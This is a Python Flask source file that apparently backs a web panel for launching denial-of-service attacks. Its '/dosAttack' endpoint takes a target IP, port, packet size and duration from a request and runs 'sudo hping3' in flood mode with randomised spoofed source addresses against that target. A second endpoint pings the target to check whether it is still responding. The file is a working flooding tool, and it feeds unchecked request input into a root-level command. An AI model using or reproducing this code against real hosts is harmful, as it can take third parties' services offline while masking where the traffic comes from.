from flask import Blueprint, request
import signal
import subprocess
import time

dosAttack = Blueprint("dosAttack", __name__, url_prefix="/dosAttack")

@dosAttack.post("/")
def SYNFloodAttack():
    data = request.get_json()
    ipAddress = data["ipAddress"]
    portNumber = data["portNumber"]
    packetSize = data["packetSize"]
    attackType = data["attackType"]
    duration = int(data["duration"])

    dosCommand = subprocess.Popen(
        ['sudo', 'hping3', attackType, '-d', packetSize, '--flood', '--rand-source', '-p', portNumber, ipAddress],
        stdout=subprocess.PIPE,
        text=True)
    time.sleep(duration) # carry out attack for specified duration

    try:
        dosCommand.send_signal(signal.SIGINT) # Send CTRL+c to kill the child process
    except subprocess.TimeoutExpired:
        print('Timeout occured')
    
    dosCommand.kill()
    return ""

@dosAttack.post("/latency")
def checkLatency():
    data = request.get_json()
    ipAddress = data["ipAddress"]

    pingCommand = subprocess.Popen(['ping', '-c', '1', '-w', '2', '-O', ipAddress], stdout=subprocess.PIPE, text=True)
    output, _ = pingCommand.communicate()  # Capture the output and wait for the process to finish

    lines = output.splitlines()
    line = lines[1]

    if "time" in line:
        return '[PING SUCCESS] ' + line
    else:
        return '[PING FAILED] ' + line